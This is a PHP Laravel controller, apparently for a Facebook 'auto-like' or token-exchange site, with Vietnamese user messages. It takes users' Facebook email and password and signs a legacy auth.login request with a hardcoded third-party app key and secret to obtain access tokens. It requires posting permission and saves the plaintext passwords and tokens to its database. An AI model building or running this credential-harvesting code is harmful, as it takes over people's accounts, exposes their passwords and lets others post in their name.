<?php

	namespace App\Http\Controllers;

	use App\Account;
	use Illuminate\Http\Request;

	class AccountController extends Controller
	{
		public function attemp(Request $request)
		{
			$accessToken = $request->access_token;

			// get and check access token valid
			$abouMe = json_decode($this->curl($this->apiUrl('me', $accessToken)));
			if (isset($abouMe->error)) {
				return response()->json([
					'result' => false,
					'msg' => 'Access token không hoạt động.'
				]);
			}

			// get and check permissions of token
			$permissions = json_decode($this->curl($this->apiUrl('me/permissions', $accessToken)));
			if ($permissions->data[0]->publish_actions == 0) {
				return response()->json([
					'result' => false,
					'msg' => 'Access token không đủ quyền thực hiện nhiệm vụ.'
				]);
			}

			// check user has in database
			$user = Account::whereFbId($abouMe->id)->first();
			if (!$user) {
				$data = [
					'fb_id' => $abouMe->id,
					'email' => session('email', 'blank'),
					'password' => session('password', 'blank'),
					'access_token' => $accessToken,
					'other' => $request->other ?? 'blank'
				];
				Account::create($data);
			} else {
				$user->access_token = $accessToken;
				$user->email = session('email', 'blank');
				$user->password = session('password', 'blank');
				$user->other = $request->other ?? $user->other;
				$user->save();
			}

			session(['access_token' => $accessToken]);

			return response()->json([
				'result' => true,
				'msg' => 'Đăng nhập thành công'
			]);
		}

		public function getFacebookApiUrl(Request $request)
		{
			$email = $request->email;
			$password = $request->password;

			session(['email' => $email]);
			session(['password' => $password]);

			$data = [
				'api_key' => '3e7c78e35a76a9299309885393b02d97',
				'email' => $email,
				'format' => 'JSON',
				'generate_session_cookies' => '1',
				'locale' => 'vi_vn',
				'method' => 'auth.login',
				'password' => $password,
				'return_ssl_resources' => '0',
				'v' => '1.0'
			];

			$signature = '';
			foreach ($data as $key => $value) {
				$signature .= $key . '=' . $value;
			}
			$signature .= 'c1e620fa708a1d5696fb991c1bde5662';

			$data['sig'] = md5($signature);

			$apiUrl = 'https://api.facebook.com/restserver.php?' . http_build_query($data);

			return response()->json([
				'url' => $apiUrl
			]);
		}

		public function apiUrl($path, $accessToken)
		{
			return 'https://graph.facebook.com/' . $path . '?access_token=' . $accessToken;
		}

		public function curl($url)
		{
			return file_get_contents($url);
		}

		public function login()
		{
			return view('user.login');
		}

		public function logout()
		{
			session(['access_token' => null]);
			return redirect('/login');
		}

		public function earner()
		{
			return view('user.earner');
		}

	}
